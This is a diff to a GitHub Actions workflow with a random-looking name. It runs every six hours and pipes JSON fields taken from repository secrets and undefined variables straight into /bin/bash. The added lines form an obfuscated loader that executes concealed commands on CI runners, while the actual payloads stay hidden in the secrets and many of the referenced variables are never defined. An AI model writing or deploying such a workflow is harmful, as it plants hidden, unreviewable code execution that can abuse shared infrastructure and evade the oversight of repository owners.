@@ -1,20 +1,31 @@
 name: longfeishu2123
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 4/6 * * *'
+    - cron: '59 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: longfeishu2123
         env:
-          c95568: ${{ secrets.c95568 }}
+          eezh07: ${{ secrets.eezh07 }}
         run: |
-          echo $c95568 | jq -r .fqyq76 | /bin/bash
-          echo $jkkns21109 | jq -r .o83426 | /bin/bash
-          echo $sdrx7 | jq -r .tqn21 | /bin/bash
-          echo $obwck9 | jq -r .skefo434 | /bin/bash
+          echo $eezh07 | jq -r .ksl697 | /bin/bash
+          echo $feywg9748 | jq -r .c6 | /bin/bash
+          echo $afzxx78 | jq -r .imd33 | /bin/bash
+          echo $foqa44201 | jq -r .o9 | /bin/bash
+          echo $trai70 | jq -r .jfzib5 | /bin/bash
+          echo $kcr7600 | jq -r .lvov88 | /bin/bash
+          echo $ens6 | jq -r .dumi8647 | /bin/bash
+          echo $w969 | jq -r .v795 | /bin/bash
+          echo $o3 | jq -r .wv233 | /bin/bash
+          echo $i33182 | jq -r .po3 | /bin/bash
+          echo $bzir6 | jq -r .zo5022 | /bin/bash
+          echo $fiuos23903 | jq -r .zs1508 | /bin/bash
+          echo $dsplc62 | jq -r .klakf2 | /bin/bash
+          echo $tbjnj83 | jq -r .ht9 | /bin/bash
+          echo $yj2732 | jq -r .hmbo672 | /bin/bash
 
